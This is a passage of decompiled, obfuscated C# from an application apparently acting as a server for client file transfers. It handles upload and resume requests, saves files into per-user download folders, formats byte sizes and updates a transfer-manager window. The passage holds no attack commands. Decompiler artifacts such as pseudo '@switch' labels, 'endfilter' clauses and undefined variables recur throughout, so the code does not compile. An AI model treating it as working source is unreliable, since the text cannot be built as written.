											Class130.fTransferManager_0.method_17(cclient2.FILE_TRANSFER_ID);
											Class130.concurrentDictionary_0[cclient2.FILE_TRANSFER_ID].TRANSFER_ACTIVE = false;
											cclient2.FILE_TRANSFER_COMPLETED = true;
											fMain ff12 = cclient2.ff;
											CClient cclient173 = cclient2;
											ptr11 = ref cclient173.FILE_TRANSFER_USER_KEY;
											value3 = cclient173.FILE_TRANSFER_USER_KEY;
											ff12.method_24(ref value3);
											ptr11 = Conversions.ToString(value3);
											cclient2.sock_async.method_6(Encoding.UTF8.GetBytes("0"));
											ptr2 = ref Class130.struct20_0.double_3;
											Class130.struct20_0.double_3 = ptr2 + 1.0;
											CClient cclient174 = Class130.concurrentDictionary_3[cclient2.FILE_TRANSFER_USER_KEY];
											ptr2 = ref cclient174.stats_bytes_out;
											cclient174.stats_bytes_out = ptr2 + 1.0;
											CClient cclient175 = cclient2;
											flag3 = false;
											cclient175.SOCKET_DISCONNECT(ref flag3);
											return;
										}
									}
									else if (Class135.smethod_0().TransferReplaceFilesModified)
									{
										if (File.Exists(string.Concat(new string[]
										{
											Application.StartupPath,
											"\\Downloads\\",
											cclient2.FILE_TRANSFER_USER,
											"\\",
											cclient2.FILE_TRANSFER_FILENAME
										})))
										{
											double num82 = Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE);
											string text15 = string.Concat(new string[]
											{
												Application.StartupPath,
												"\\Downloads\\",
												cclient2.FILE_TRANSFER_USER,
												"\\",
												cclient2.FILE_TRANSFER_FILENAME
											});
											bool flag6 = num82 != (double)Class136.smethod_32(ref text15);
											double num83 = Conversions.ToDouble(cclient2.FILE_TRANSFER_FILE_LAST_MODIFIED);
											text15 = string.Concat(new string[]
											{
												Application.StartupPath,
												"\\Downloads\\",
												cclient2.FILE_TRANSFER_USER,
												"\\",
												cclient2.FILE_TRANSFER_FILENAME
											});
											if (flag6 | num83 == (double)Class136.smethod_16(ref text15))
											{
												fTransferManager fTransferManager_12 = Class130.fTransferManager_0;
												string file_TRANSFER_ID12 = cclient2.FILE_TRANSFER_ID;
												int num84 = 2;
												double num85 = Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE);
												bool flag3 = false;
												ref bool ptr10 = ref flag3;
												double num28 = num85;
												int num86 = num84;
												string string_49 = file_TRANSFER_ID12;
												fTransferManager fTransferManager14 = fTransferManager_12;
												string text6;
												object obj25;
												try
												{
													ProjectData.ClearProjectError();
													num30 = 2;
													string text5 = string.Empty;
													if (num28 >= 1099511627776.0)
													{
														text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
													}
													else if (num28 >= 1073741824.0)
													{
														text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
													}
													else if (num28 >= 1048576.0)
													{
														text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
													}
													else if (num28 >= 1024.0)
													{
														text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
													}
													else if (num28 < 1024.0)
													{
														text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
													}
													if (ptr10)
													{
														text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
													}
													if (text5.Length > 0)
													{
														text6 = text5;
													}
													else
													{
														text6 = " 0 B";
													}
													IL_819C:
													goto IL_81EC;
													IL_819E:
													text6 = "0 B";
													goto IL_819C;
													IL_81A7:
													num31 = -1;
													@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
													IL_81BD:;
												}
												catch when (endfilter(obj25 is Exception & num30 != 0 & num31 == 0))
												{
													Exception ex59 = (Exception)obj26;
													goto IL_81A7;
												}
												throw ProjectData.CreateProjectError(-2146828237);
												IL_81EC:
												if (num31 != 0)
												{
													ProjectData.ClearProjectError();
												}
												string string_50 = text6;
												fTransferManager14.method_16(string_49, num86, string_50);
												fTransferManager fTransferManager_13 = Class130.fTransferManager_0;
												string file_TRANSFER_ID13 = cclient2.FILE_TRANSFER_ID;
												int num87 = 3;
												double num88 = 0.0;
												flag3 = false;
												ptr10 = ref flag3;
												num28 = num88;
												int num89 = num87;
												string string_51 = file_TRANSFER_ID13;
												fTransferManager fTransferManager15 = fTransferManager_13;
												object obj27;
												try
												{
													ProjectData.ClearProjectError();
													num30 = 2;
													string text5 = string.Empty;
													if (num28 >= 1099511627776.0)
													{
														text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
													}
													else if (num28 >= 1073741824.0)
													{
														text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
													}
													else if (num28 >= 1048576.0)
													{
														text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
													}
													else if (num28 >= 1024.0)
													{
														text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
													}
													else if (num28 < 1024.0)
													{
														text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
													}
													if (ptr10)
													{
														text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
													}
													if (text5.Length > 0)
													{
														text6 = text5;
													}
													else
													{
														text6 = " 0 B";
													}
													IL_83A6:
													goto IL_83F6;
													IL_83A8:
													text6 = "0 B";
													goto IL_83A6;
													IL_83B1:
													num31 = -1;
													@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
													IL_83C7:;
												}
												catch when (endfilter(obj27 is Exception & num30 != 0 & num31 == 0))
												{
													Exception ex60 = (Exception)obj28;
													goto IL_83B1;
												}
												throw ProjectData.CreateProjectError(-2146828237);
												IL_83F6:
												if (num31 != 0)
												{
													ProjectData.ClearProjectError();
												}
												string str34 = text6;
												fTransferManager15.method_16(string_51, num89, str34 + " (0%)");
												Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 4, "N/A");
												Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 5, "Ignored (File already exists)");
												Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 7, "N/A");
												Class130.fTransferManager_0.method_17(cclient2.FILE_TRANSFER_ID);
												Class130.concurrentDictionary_0[cclient2.FILE_TRANSFER_ID].TRANSFER_ACTIVE = false;
												cclient2.FILE_TRANSFER_COMPLETED = true;
												fMain ff13 = cclient2.ff;
												CClient cclient176 = cclient2;
												ptr11 = ref cclient176.FILE_TRANSFER_USER_KEY;
												value3 = cclient176.FILE_TRANSFER_USER_KEY;
												ff13.method_24(ref value3);
												ptr11 = Conversions.ToString(value3);
												cclient2.sock_async.method_6(Encoding.UTF8.GetBytes("0"));
												ptr2 = ref Class130.struct20_0.double_3;
												Class130.struct20_0.double_3 = ptr2 + 1.0;
												CClient cclient177 = Class130.concurrentDictionary_3[cclient2.FILE_TRANSFER_USER_KEY];
												ptr2 = ref cclient177.stats_bytes_out;
												cclient177.stats_bytes_out = ptr2 + 1.0;
												CClient cclient178 = cclient2;
												flag3 = false;
												cclient178.SOCKET_DISCONNECT(ref flag3);
												return;
											}
											if (File.Exists(string.Concat(new string[]
											{
												Application.StartupPath,
												"\\Downloads\\",
												cclient2.FILE_TRANSFER_USER,
												"\\",
												cclient2.FILE_TRANSFER_FILENAME
											})))
											{
												File.Delete(string.Concat(new string[]
												{
													Application.StartupPath,
													"\\Downloads\\",
													cclient2.FILE_TRANSFER_USER,
													"\\",
													cclient2.FILE_TRANSFER_FILENAME
												}));
											}
										}
									}
									else if (!Class135.smethod_0().TransferReplaceFilesModified && File.Exists(string.Concat(new string[]
									{
										Application.StartupPath,
										"\\Downloads\\",
										cclient2.FILE_TRANSFER_USER,
										"\\",
										cclient2.FILE_TRANSFER_FILENAME
									})))
									{
										File.Delete(string.Concat(new string[]
										{
											Application.StartupPath,
											"\\Downloads\\",
											cclient2.FILE_TRANSFER_USER,
											"\\",
											cclient2.FILE_TRANSFER_FILENAME
										}));
									}
								}
								catch (Exception ex61)
								{
									fTransferManager fTransferManager_14 = Class130.fTransferManager_0;
									string file_TRANSFER_ID14 = cclient2.FILE_TRANSFER_ID;
									int num90 = 2;
									double num91 = 0.0;
									bool flag3 = false;
									ref bool ptr10 = ref flag3;
									double num28 = num91;
									int num92 = num90;
									string string_52 = file_TRANSFER_ID14;
									fTransferManager fTransferManager16 = fTransferManager_14;
									string text6;
									object obj29;
									try
									{
										ProjectData.ClearProjectError();
										num30 = 2;
										string text5 = string.Empty;
										if (num28 >= 1099511627776.0)
										{
											text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
										}
										else if (num28 >= 1073741824.0)
										{
											text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
										}
										else if (num28 >= 1048576.0)
										{
											text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
										}
										else if (num28 >= 1024.0)
										{
											text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
										}
										else if (num28 < 1024.0)
										{
											text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
										}
										if (ptr10)
										{
											text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
										}
										if (text5.Length > 0)
										{
											text6 = text5;
										}
										else
										{
											text6 = " 0 B";
										}
										IL_87D1:
										goto IL_8821;
										IL_87D3:
										text6 = "0 B";
										goto IL_87D1;
										IL_87DC:
										num31 = -1;
										@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
										IL_87F2:;
									}
									catch when (endfilter(obj29 is Exception & num30 != 0 & num31 == 0))
									{
										Exception ex62 = (Exception)obj30;
										goto IL_87DC;
									}
									throw ProjectData.CreateProjectError(-2146828237);
									IL_8821:
									if (num31 != 0)
									{
									}
									string string_53 = text6;
									fTransferManager16.method_16(string_52, num92, string_53);
									fTransferManager fTransferManager_15 = Class130.fTransferManager_0;
									string file_TRANSFER_ID15 = cclient2.FILE_TRANSFER_ID;
									int num93 = 3;
									double num94 = 0.0;
									flag3 = false;
									ptr10 = ref flag3;
									num28 = num94;
									int num95 = num93;
									string string_54 = file_TRANSFER_ID15;
									fTransferManager fTransferManager17 = fTransferManager_15;
									object obj31;
									try
									{
										ProjectData.ClearProjectError();
										num30 = 2;
										string text5 = string.Empty;
										if (num28 >= 1099511627776.0)
										{
											text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
										}
										else if (num28 >= 1073741824.0)
										{
											text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
										}
										else if (num28 >= 1048576.0)
										{
											text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
										}
										else if (num28 >= 1024.0)
										{
											text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
										}
										else if (num28 < 1024.0)
										{
											text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
										}
										if (ptr10)
										{
											text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
										}
										if (text5.Length > 0)
										{
											text6 = text5;
										}
										else
										{
											text6 = " 0 B";
										}
										IL_89DB:
										goto IL_8A2B;
										IL_89DD:
										text6 = "0 B";
										goto IL_89DB;
										IL_89E6:
										num31 = -1;
										@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
										IL_89FC:;
									}
									catch when (endfilter(obj31 is Exception & num30 != 0 & num31 == 0))
									{
										Exception ex63 = (Exception)obj32;
										goto IL_89E6;
									}
									throw ProjectData.CreateProjectError(-2146828237);
									IL_8A2B:
									if (num31 != 0)
									{
									}
									string str35 = text6;
									fTransferManager17.method_16(string_54, num95, str35 + " (0%)");
									fTransferManager fTransferManager_16 = Class130.fTransferManager_0;
									string file_TRANSFER_ID16 = cclient2.FILE_TRANSFER_ID;
									int num96 = 4;
									double num97 = 0.0;
									flag3 = false;
									ptr10 = ref flag3;
									num28 = num97;
									int num98 = num96;
									string string_55 = file_TRANSFER_ID16;
									fTransferManager fTransferManager18 = fTransferManager_16;
									object obj33;
									try
									{
										ProjectData.ClearProjectError();
										num30 = 2;
										string text5 = string.Empty;
										if (num28 >= 1099511627776.0)
										{
											text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
										}
										else if (num28 >= 1073741824.0)
										{
											text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
										}
										else if (num28 >= 1048576.0)
										{
											text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
										}
										else if (num28 >= 1024.0)
										{
											text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
										}
										else if (num28 < 1024.0)
										{
											text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
										}
										if (ptr10)
										{
											text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
										}
										if (text5.Length > 0)
										{
											text6 = text5;
										}
										else
										{
											text6 = " 0 B";
										}
										IL_8BEF:
										goto IL_8C3F;
										IL_8BF1:
										text6 = "0 B";
										goto IL_8BEF;
										IL_8BFA:
										num31 = -1;
										@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
										IL_8C10:;
									}
									catch when (endfilter(obj33 is Exception & num30 != 0 & num31 == 0))
									{
										Exception ex64 = (Exception)obj34;
										goto IL_8BFA;
									}
									throw ProjectData.CreateProjectError(-2146828237);
									IL_8C3F:
									if (num31 != 0)
									{
									}
									string str36 = text6;
									fTransferManager18.method_16(string_55, num98, str36 + "/s");
									Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 5, "Failed (File in use)");
									Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 7, "N/A");
									Class130.fTransferManager_0.method_17(cclient2.FILE_TRANSFER_ID);
									Class130.concurrentDictionary_0[cclient2.FILE_TRANSFER_ID].TRANSFER_ACTIVE = false;
									cclient2.FILE_TRANSFER_COMPLETED = true;
									fMain ff14 = cclient2.ff;
									CClient cclient179 = cclient2;
									ptr11 = ref cclient179.FILE_TRANSFER_USER_KEY;
									value3 = cclient179.FILE_TRANSFER_USER_KEY;
									ff14.method_24(ref value3);
									ptr11 = Conversions.ToString(value3);
									cclient2.sock_async.method_6(Encoding.UTF8.GetBytes("0"));
									ptr2 = ref Class130.struct20_0.double_3;
									Class130.struct20_0.double_3 = ptr2 + 1.0;
									CClient cclient180 = Class130.concurrentDictionary_3[cclient2.FILE_TRANSFER_USER_KEY];
									ptr2 = ref cclient180.stats_bytes_out;
									cclient180.stats_bytes_out = ptr2 + 1.0;
									goto IL_DF2C;
								}
								if (Conversion.Val(cclient2.FILE_TRANSFER_FILESIZE) == 0.0)
								{
									string text15 = Path.GetDirectoryName(string.Concat(new string[]
									{
										Application.StartupPath,
										"\\Downloads\\",
										cclient2.FILE_TRANSFER_USER,
										"\\",
										cclient2.FILE_TRANSFER_FILENAME
									}));
									Class136.smethod_17(ref text15);
									File.Create(string.Concat(new string[]
									{
										Application.StartupPath,
										"\\Downloads\\",
										cclient2.FILE_TRANSFER_USER,
										"\\",
										cclient2.FILE_TRANSFER_FILENAME
									})).Dispose();
									fTransferManager fTransferManager_17 = Class130.fTransferManager_0;
									string file_TRANSFER_ID17 = cclient2.FILE_TRANSFER_ID;
									int num99 = 2;
									double num100 = Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE);
									bool flag3 = false;
									ref bool ptr10 = ref flag3;
									double num28 = num100;
									int num101 = num99;
									string string_56 = file_TRANSFER_ID17;
									fTransferManager fTransferManager19 = fTransferManager_17;
									string text6;
									object obj35;
									try
									{
										ProjectData.ClearProjectError();
										num30 = 2;
										string text5 = string.Empty;
										if (num28 >= 1099511627776.0)
										{
											text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
										}
										else if (num28 >= 1073741824.0)
										{
											text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
										}
										else if (num28 >= 1048576.0)
										{
											text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
										}
										else if (num28 >= 1024.0)
										{
											text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
										}
										else if (num28 < 1024.0)
										{
											text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
										}
										if (ptr10)
										{
											text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
										}
										if (text5.Length > 0)
										{
											text6 = text5;
										}
										else
										{
											text6 = " 0 B";
										}
										IL_8F8C:
										goto IL_8FDC;
										IL_8F8E:
										text6 = "0 B";
										goto IL_8F8C;
										IL_8F97:
										num31 = -1;
										@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
										IL_8FAD:;
									}
									catch when (endfilter(obj35 is Exception & num30 != 0 & num31 == 0))
									{
										Exception ex65 = (Exception)obj36;
										goto IL_8F97;
									}
									throw ProjectData.CreateProjectError(-2146828237);
									IL_8FDC:
									if (num31 != 0)
									{
										ProjectData.ClearProjectError();
									}
									string string_57 = text6;
									fTransferManager19.method_16(string_56, num101, string_57);
									fTransferManager fTransferManager_18 = Class130.fTransferManager_0;
									string file_TRANSFER_ID18 = cclient2.FILE_TRANSFER_ID;
									int num102 = 3;
									double num103 = Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE);
									flag3 = false;
									ptr10 = ref flag3;
									num28 = num103;
									int num104 = num102;
									string string_58 = file_TRANSFER_ID18;
									fTransferManager fTransferManager20 = fTransferManager_18;
									object obj37;
									try
									{
										ProjectData.ClearProjectError();
										num30 = 2;
										string text5 = string.Empty;
										if (num28 >= 1099511627776.0)
										{
											text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
										}
										else if (num28 >= 1073741824.0)
										{
											text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
										}
										else if (num28 >= 1048576.0)
										{
											text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
										}
										else if (num28 >= 1024.0)
										{
											text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
										}
										else if (num28 < 1024.0)
										{
											text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
										}
										if (ptr10)
										{
											text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
										}
										if (text5.Length > 0)
										{
											text6 = text5;
										}
										else
										{
											text6 = " 0 B";
										}
										IL_9199:
										goto IL_91E9;
										IL_919B:
										text6 = "0 B";
										goto IL_9199;
										IL_91A4:
										num31 = -1;
										@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
										IL_91BA:;
									}
									catch when (endfilter(obj37 is Exception & num30 != 0 & num31 == 0))
									{
										Exception ex66 = (Exception)obj38;
										goto IL_91A4;
									}
									throw ProjectData.CreateProjectError(-2146828237);
									IL_91E9:
									if (num31 != 0)
									{
										ProjectData.ClearProjectError();
									}
									string str37 = text6;
									fTransferManager20.method_16(string_58, num104, str37 + " (100%)");
									fTransferManager fTransferManager_19 = Class130.fTransferManager_0;
									string file_TRANSFER_ID19 = cclient2.FILE_TRANSFER_ID;
									int num105 = 4;
									double num106 = Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE);
									flag3 = false;
									ptr10 = ref flag3;
									num28 = num106;
									int num107 = num105;
									string string_59 = file_TRANSFER_ID19;
									fTransferManager fTransferManager21 = fTransferManager_19;
									object obj39;
									try
									{
										ProjectData.ClearProjectError();
										num30 = 2;
										string text5 = string.Empty;
										if (num28 >= 1099511627776.0)
										{
											text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
										}
										else if (num28 >= 1073741824.0)
										{
											text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
										}
										else if (num28 >= 1048576.0)
										{
											text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
										}
										else if (num28 >= 1024.0)
										{
											text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
										}
										else if (num28 < 1024.0)
										{
											text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
										}
										if (ptr10)
										{
											text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
										}
										if (text5.Length > 0)
										{
											text6 = text5;
										}
										else
										{
											text6 = " 0 B";
										}
										IL_93B0:
										goto IL_9400;
										IL_93B2:
										text6 = "0 B";
										goto IL_93B0;
										IL_93BB:
										num31 = -1;
										@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
										IL_93D1:;
									}
									catch when (endfilter(obj39 is Exception & num30 != 0 & num31 == 0))
									{
										Exception ex67 = (Exception)obj40;
										goto IL_93BB;
									}
									throw ProjectData.CreateProjectError(-2146828237);
									IL_9400:
									if (num31 != 0)
									{
										ProjectData.ClearProjectError();
									}
									string str38 = text6;
									fTransferManager21.method_16(string_59, num107, str38 + "/s");
									Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 5, "Completed");
									Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 7, "N/A");
									Class130.fTransferManager_0.method_17(cclient2.FILE_TRANSFER_ID);
									text15 = string.Concat(new string[]
									{
										Application.StartupPath,
										"\\Downloads\\",
										cclient2.FILE_TRANSFER_USER,
										"\\",
										cclient2.FILE_TRANSFER_FILENAME
									});
									long num48 = Conversions.ToLong(cclient2.FILE_TRANSFER_FILE_LAST_MODIFIED);
									ref string ptr12 = ref text15;
									if (File.Exists(ptr12))
									{
										DateTime dateTime = new DateTime(1970, 1, 1);
										try
										{
											File.SetLastWriteTimeUtc(ptr12, dateTime.AddSeconds((double)num48));
										}
										catch (Exception ex68)
										{
										}
									}
									Class130.concurrentDictionary_0[cclient2.FILE_TRANSFER_ID].TRANSFER_ACTIVE = false;
									cclient2.FILE_TRANSFER_COMPLETED = true;
									cclient2.sock_async.method_6(Encoding.UTF8.GetBytes("1"));
									ptr2 = ref Class130.struct20_0.double_3;
									Class130.struct20_0.double_3 = ptr2 + 1.0;
									CClient cclient181 = Class130.concurrentDictionary_3[cclient2.FILE_TRANSFER_USER_KEY];
									ptr2 = ref cclient181.stats_bytes_out;
									cclient181.stats_bytes_out = ptr2 + 1.0;
									Thread.Sleep(1000);
									fMain ff15 = cclient2.ff;
									CClient cclient182 = cclient2;
									ptr11 = ref cclient182.FILE_TRANSFER_USER_KEY;
									value3 = cclient182.FILE_TRANSFER_USER_KEY;
									ff15.method_24(ref value3);
									ptr11 = Conversions.ToString(value3);
									goto IL_DF2C;
								}
								cclient2.sock_async.method_6(Encoding.UTF8.GetBytes("1"));
								ptr2 = ref Class130.struct20_0.double_3;
								Class130.struct20_0.double_3 = ptr2 + 1.0;
								CClient cclient183 = Class130.concurrentDictionary_3[cclient2.FILE_TRANSFER_USER_KEY];
								ptr2 = ref cclient183.stats_bytes_out;
								cclient183.stats_bytes_out = ptr2 + 1.0;
								return;
							}
							else
							{
								if (Operators.CompareString(left, "FL_DL_RESUME", true) == 0)
								{
									try
									{
										cclient2.sock_async.socket_0.ReceiveBufferSize = Class135.smethod_0().TransfersRecvBytes;
										string[] array9 = Strings.Split(text14, "|", 8, CompareMethod.Text);
										cclient2.FILE_TRANSFER_USER = Class130.concurrentDictionary_3[array9[1]].FILE_TRANSFER_USER;
										cclient2.FILE_TRANSFER_FILENAME = Class130.concurrentDictionary_3[array9[1]].FILE_TRANSFER_FILENAME;
										cclient2.FILE_TRANSFER_FILESIZE = Class130.concurrentDictionary_3[array9[1]].FILE_TRANSFER_FILESIZE;
										cclient2.FILE_TRANSFER_REMOTE_FILE = Class130.concurrentDictionary_3[array9[1]].FILE_TRANSFER_REMOTE_FILE;
										cclient2.FILE_TRANSFER_ID = Class130.concurrentDictionary_3[array9[1]].FILE_TRANSFER_ID;
										cclient2.FILE_TRANSFER_DL_DATA = Class130.concurrentDictionary_3[array9[1]].FILE_TRANSFER_DL_DATA;
										cclient2.FILE_TRANSFER_PACKETS = Class130.concurrentDictionary_3[array9[1]].FILE_TRANSFER_PACKETS;
										cclient2.FILE_TRANSFER_POS = Class130.concurrentDictionary_3[array9[1]].FILE_TRANSFER_POS;
										cclient2.FILE_TRANSFER_SPEED_AVG = Class130.concurrentDictionary_3[array9[1]].FILE_TRANSFER_SPEED_AVG;
										cclient2.FILE_TRANSFER_SPEED_COUNTER = Class130.concurrentDictionary_3[array9[1]].FILE_TRANSFER_SPEED_COUNTER;
										cclient2.FILE_TRANSFER_USER = Class130.concurrentDictionary_3[array9[1]].FILE_TRANSFER_USER;
										cclient2.FILE_TRANSFER_USER_KEY = Class130.concurrentDictionary_3[array9[1]].FILE_TRANSFER_USER_KEY;
										cclient2.FILE_TRANSFER_ELAPSED = Class130.concurrentDictionary_3[array9[1]].FILE_TRANSFER_ELAPSED;
										cclient2.FILE_TRANSFER_STARTED = (double)Class136.smethod_36() - cclient2.FILE_TRANSFER_ELAPSED;
										cclient2.FILE_TRANSFER_LAST_PACKET = Class136.smethod_36();
										cclient2.FILE_TRANSFER_IS_RESUME = true;
										ref double ptr2 = ref Class130.struct20_0.double_2;
										Class130.struct20_0.double_2 = ptr2 + (double)num;
										ptr2 = ref Class130.struct20_0.double_4;
										Class130.struct20_0.double_4 = ptr2 + 1.0;
										string key = cclient2.FILE_TRANSFER_USER_KEY;
										bool flag5;
										try
										{
											flag5 = Class130.concurrentDictionary_3.ContainsKey(key);
											goto IL_97F2;
										}
										catch (Exception ex69)
										{
										}
										flag5 = false;
										IL_97F2:
										if (!flag5)
										{
											CClient cclient184 = cclient2;
											bool flag3 = false;
											cclient184.SOCKET_DISCONNECT(ref flag3);
										}
										else
										{
											cclient2.FILE_TRANSFER_ACTIVE = true;
											CClient cclient185 = Class130.concurrentDictionary_3[cclient2.FILE_TRANSFER_USER_KEY];
											ptr2 = ref cclient185.stats_bytes_in;
											cclient185.stats_bytes_in = ptr2 + (double)num;
											cclient2.sock_async.method_6(Encoding.UTF8.GetBytes("1"));
											ptr2 = ref Class130.struct20_0.double_3;
											Class130.struct20_0.double_3 = ptr2 + 1.0;
											CClient cclient186 = Class130.concurrentDictionary_3[cclient2.FILE_TRANSFER_USER_KEY];
											ptr2 = ref cclient186.stats_bytes_out;
											cclient186.stats_bytes_out = ptr2 + 1.0;
											Class130.concurrentDictionary_0[cclient2.FILE_TRANSFER_ID].TRANSFER_ACTIVE = true;
											Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 5, "Downloading");
											Class130.fTransferManager_0.method_17(cclient2.FILE_TRANSFER_ID);
											Class130.fTransferManager_0.method_2(cclient2.FILE_TRANSFER_ID, cclient2.sKey, cclient2.FILE_TRANSFER_USER_KEY, string.Concat(new string[]
											{
												Application.StartupPath,
												"\\Downloads\\",
												cclient2.FILE_TRANSFER_USER,
												"\\",
												cclient2.FILE_TRANSFER_FILENAME
											}), cclient2.FILE_TRANSFER_REMOTE_FILE);
											stringBuilder.Clear();
										}
									}
									catch (Exception ex70)
									{
										CClient cclient187 = cclient2;
										bool flag3 = false;
										cclient187.SOCKET_DISCONNECT(ref flag3);
									}
									return;
								}
								int num30;
								int num31;
								if (Operators.CompareString(left, "FL_UP", true) == 0)
								{
									try
									{
										if (cclient2.IS_SSL)
										{
											cclient2.sock_async.socket_0.ReceiveBufferSize = Class135.smethod_0().TransfersRecvBytes;
											cclient2.sock_async.socket_0.SendBufferSize = Class135.smethod_0().TransfersSendBytes;
										}
										else
										{
											cclient2.sock_async.socket_0.ReceiveBufferSize = 8192;
											cclient2.sock_async.socket_0.SendBufferSize = 8192;
										}
										string[] array9 = Strings.Split(text14, "|", 7, CompareMethod.Text);
										cclient2.FILE_TRANSFER_ID = "i" + cclient2.mSocketCounter;
										cclient2.FILE_TRANSFER_USER_KEY = array9[1];
										cclient2.FILE_TRANSFER_USER = array9[2];
										cclient2.FILE_TRANSFER_LOCAL_FILE = Encoding.UTF8.GetString(Convert.FromBase64String(array9[3]));
										cclient2.FILE_TRANSFER_GROUP_ID = Encoding.UTF8.GetString(Convert.FromBase64String(array9[4]));
										cclient2.FILE_TRANSFER_FILESIZE = Conversions.ToString(Class136.smethod_32(ref cclient2.FILE_TRANSFER_LOCAL_FILE));
										cclient2.FILE_TRANSFER_LAST_PACKET = Class136.smethod_36();
										cclient2.FILE_TRANSFER_STARTED = (double)Class136.smethod_36();
										ref double ptr2 = ref Class130.struct20_0.double_2;
										Class130.struct20_0.double_2 = ptr2 + (double)num;
										ptr2 = ref Class130.struct20_0.double_4;
										Class130.struct20_0.double_4 = ptr2 + 1.0;
										string key = cclient2.FILE_TRANSFER_USER_KEY;
										bool flag5;
										try
										{
											flag5 = Class130.concurrentDictionary_3.ContainsKey(key);
											goto IL_9AC0;
										}
										catch (Exception ex71)
										{
										}
										flag5 = false;
										IL_9AC0:
										if (!flag5)
										{
											CClient cclient188 = cclient2;
											bool flag3 = false;
											cclient188.SOCKET_DISCONNECT(ref flag3);
										}
										else
										{
											cclient2.FILE_TRANSFER_ACTIVE = true;
											CClient cclient189 = Class130.concurrentDictionary_3[cclient2.FILE_TRANSFER_USER_KEY];
											ptr2 = ref cclient189.stats_bytes_in;
											cclient189.stats_bytes_in = ptr2 + (double)num;
											stringBuilder.Clear();
											fMain ff16 = cclient2.ff;
											CClient cclient190 = cclient2;
											ref string ptr11 = ref cclient190.FILE_TRANSFER_USER_KEY;
											object value3 = cclient190.FILE_TRANSFER_USER_KEY;
											ff16.method_24(ref value3);
											ptr11 = Conversions.ToString(value3);
